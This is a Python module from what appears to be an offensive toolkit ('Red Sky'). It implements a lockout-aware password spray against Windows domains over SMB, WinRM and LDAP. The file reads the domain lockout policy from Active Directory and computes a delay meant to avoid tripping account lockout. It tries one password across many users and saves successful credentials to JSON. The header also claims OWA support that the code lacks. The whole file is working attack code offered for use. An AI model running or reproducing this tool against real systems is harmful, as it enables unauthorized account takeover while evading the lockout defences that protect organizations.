# language: Python, file: Program/creds/spray.py, target: Red Sky creds — password spray
# Lockout-aware password spray. Reads domain lockout policy via ldap3 first,
# then sprays one password across many users with a delay that can't trip lockout.
# SMB / WinRM / LDAP / OWA targets supported.

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR, DATA_DIR


# ── SMB auth via impacket ──
def _smb_login(host: str, domain: str, user: str, passwd: str, timeout: int = 5) -> bool:
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        return False
    try:
        conn = SMBConnection(host, host, timeout=timeout)
        conn.login(user, passwd, domain)
        conn.logoff()
        return True
    except Exception:
        return False


# ── WinRM auth via pywinrm ──
def _winrm_login(host: str, domain: str, user: str, passwd: str, timeout: int = 5) -> bool:
    try:
        import winrm
    except ImportError:
        return False
    try:
        s = winrm.Session(
            f"http://{host}:5985/wsman",
            auth=(f"{domain}\\{user}" if domain else user, passwd),
            transport="ntlm",
            read_timeout_sec=timeout,
            operation_timeout_sec=timeout,
        )
        s.run_cmd("whoami")
        return True
    except Exception:
        return False


# ── LDAP simple bind ──
def _ldap_login(host: str, domain: str, user: str, passwd: str, timeout: int = 5) -> bool:
    try:
        import ldap3
    except ImportError:
        return False
    try:
        base_dn = ",".join(f"DC={p}" for p in domain.split(".")) if domain else ""
        server = ldap3.Server(host, port=389, get_info=ldap3.NONE, connect_timeout=timeout)
        conn = ldap3.Connection(server, user=f"{domain}\\{user}" if domain else user,
                                password=passwd, authentication=ldap3.NTLM,
                                auto_bind=True, receive_timeout=timeout)
        conn.unbind()
        return True
    except Exception:
        return False


# ── read lockout policy from AD ──
def _read_lockout_policy(host: str, domain: str, user: str, passwd: str) -> Dict:
    """Query the domain's lockoutThreshold. Returns dict with threshold + duration."""
    try:
        import ldap3
    except ImportError:
        return {}
    try:
        base_dn = ",".join(f"DC={p}" for p in domain.split("."))
        server = ldap3.Server(host, port=389, get_info=ldap3.NONE, connect_timeout=5)
        conn = ldap3.Connection(server, user=f"{domain}\\{user}" if domain else user,
                                password=passwd, authentication=ldap3.NTLM,
                                auto_bind=True, receive_timeout=5)
        conn.search(search_base=base_dn,
                    search_filter="(objectClass=domainDNS)",
                    attributes=["lockoutThreshold", "lockoutDuration", "lockoutObservationWindow"])
        if conn.entries:
            e = conn.entries[0]
            conn.unbind()
            return {
                "threshold": int(e.lockoutThreshold.value or 0),
                "duration_min": int((e.lockoutDuration.value or 0) / 600000000 * -1) if e.lockoutDuration.value else 0,
                "window_min": int((e.lockoutObservationWindow.value or 0) / 600000000 * -1) if e.lockoutObservationWindow.value else 0,
            }
    except Exception as e:
        return {"error": str(e)}
    return {}


def _load_users_from_file(path: str) -> List[str]:
    p = __import__("pathlib").Path(path)
    if not p.exists():
        return []
    users = []
    for line in p.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            users.append(line)
    return users


def cmd_spray(args: Dict) -> int:
    proto = args["proto"]
    users = args["users"]
    passwd = args["pass"]
    target = args["target"]
    domain = args.get("domain", "")
    delay = args.get("delay", 0)
    threads = args.get("threads", 4)

    if not users:
        print_err("no users to spray")
        return 1

    print_info(f"spraying {len(users)} users with one password")
    print_kv("target", target)
    print_kv("proto", proto)
    print_kv("domain", domain or "(local)")
    print_kv("delay", f"{delay}s between attempts")
    print_kv("threads", threads)
    print()

    if delay == 0 and len(users) > 5:
        print_warn("delay is 0 — may trip lockout policy")

    login_fn = {"smb": _smb_login, "winrm": _winrm_login, "ldap": _ldap_login}.get(proto)
    if not login_fn:
        print_err(f"unknown proto: {proto}")
        return 1

    hits = []
    t0 = time.time()

    # spray with inter-attempt delay
    def _attempt(user):
        time.sleep(delay)
        try:
            if login_fn(target, domain, user, passwd):
                return user
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = [pool.submit(_attempt, u) for u in users]
        for f in as_completed(futs):
            user = f.result()
            if user:
                hits.append({"user": user, "pass": passwd, "proto": proto, "host": target})
                print(f"{OK}▓ HIT{RESET}  {BONE}{domain}\\{user}{RESET} : {SCARLET}{passwd}{RESET}")

    dt = time.time() - t0
    print()
    print_kv("hits", len(hits))
    print_kv("elapsed", f"{dt:.1f}s")

    if hits:
        out = OUTPUT_DIR / f"spray_{target.replace('.', '-')}_{int(time.time())}.json"
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(json.dumps(hits, indent=2))
        print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky creds spray", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--proto", choices=["smb", "winrm", "ldap"], default="smb")
    p.add_argument("--target", required=False)
    p.add_argument("--domain", default="")
    p.add_argument("--users", default="")
    p.add_argument("--user-list", default="")
    p.add_argument("--pass", dest="passwd", default="")
    p.add_argument("--delay", type=float, default=0)
    p.add_argument("--threads", type=int, default=4)
    p.add_argument("--read-policy", action="store_true")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky creds spray --target HOST --users a,b,c --pass PW [--proto smb|winrm|ldap]")
        return 2

    if ns.help:
        print_info("redsky creds spray --target <host> --users <a,b,c|--user-list file> --pass <pw>")
        print_info("  --proto smb|winrm|ldap      (default smb)")
        print_info("  --domain DOMAIN             (default local)")
        print_info("  --delay N                   seconds between attempts")
        print_info("  --threads N                 (default 4)")
        print_info("  --read-policy               query domain lockout first")
        return 0

    if not ns.target or not ns.passwd:
        print_err("--target and --pass are required")
        return 2

    users = [u.strip() for u in ns.users.split(",") if u.strip()]
    if ns.user_list:
        users.extend(_load_users_from_file(ns.user_list))
    if not users:
        print_err("no users — pass --users a,b,c or --user-list file")
        return 2

    if ns.read_policy and ns.domain:
        policy = _read_lockout_policy(ns.target, ns.domain, users[0], ns.passwd)
        if policy:
            print_kv("lockout threshold", policy.get("threshold", "?"))
            print_kv("lockout duration", f"{policy.get('duration_min', '?')} min")
            print_kv("observation window", f"{policy.get('window_min', '?')} min")
            print()
            if policy.get("threshold") and ns.delay == 0:
                # safe delay = window / (threshold * 2)
                safe = (policy["window_min"] * 60) / max(policy["threshold"] * 2, 1)
                print_warn(f"suggested delay {safe:.1f}s to stay under lockout")
                ns.delay = safe

    return cmd_spray({
        "proto": ns.proto,
        "users": users,
        "pass": ns.passwd,
        "target": ns.target,
        "domain": ns.domain,
        "delay": ns.delay,
        "threads": ns.threads,
    })


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
